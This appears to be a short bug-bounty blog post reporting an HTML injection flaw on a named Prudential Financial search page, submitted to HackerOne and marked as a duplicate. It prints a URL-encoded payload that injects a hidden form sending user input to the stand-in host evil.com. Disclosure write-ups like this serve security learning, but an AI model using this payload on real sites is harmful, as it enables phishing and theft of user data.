# 🔍 First Bug Report: HTML Injection Vulnerability 🕵️‍♂️

I’m excited to share my first bug report experience with the community! 🚀

Vulnerability: HTML Injection  
Affected Site: [Prudential Financial](https://www.prudential.com/common/findfinancialprofessional?type=bylocation&term=)  
Issue: Improper handling of user input allows for the injection of malicious HTML code.

Details:  
The vulnerability was found in the input field of the page. By injecting the following payload, an attacker could potentially manipulate content, steal user data, or phish users:

```
%3 C/strong%3 E%3 Cform%20 action=%22//evil.com%22%20 method=%22 GET%22%3 E%3 Cinput%20 type=%22 text%22%20 name=%22 jo%22%20 style=%27 opacity:0;%27%3 E%3 Cinput%20 type=%22 submit%22%20 name=%22 joo%22%20 value=%22 load%20 more%20 search%22%3 E
```


Impact:  
- Steal User Data: Capture sensitive user information.  
- Phishing:Trick users into entering personal information.  
- Content Manipulation: Alter page content or user interface.  
- XSS Risk:Potential for cross-site scripting attacks.

Attachments: [Video Demonstration](https://www.awesomescreenshot.com/video/30099441?key=d6ecba16732cedfe31c02affcec78f3e)

Outcome: The report was marked as a duplicate of an existing submission, but it was a valuable learning experience for me. Thanks to HackerOne for the feedback!

Looking forward to diving into more security challenges and contributing to the community! 🌐💡  
It's just beginning 🦦

#BugBounty #WebSecurity #HTMLInjection #CyberSecurity #EthicalHacking

Press enter or click to view image in full size

![HTML Injection Discovery on HackerOne](https://miro.medium.com/v2/resize:fit:700/1*Nro1XQEDgujrbajbNkSpDg.jpeg)

---
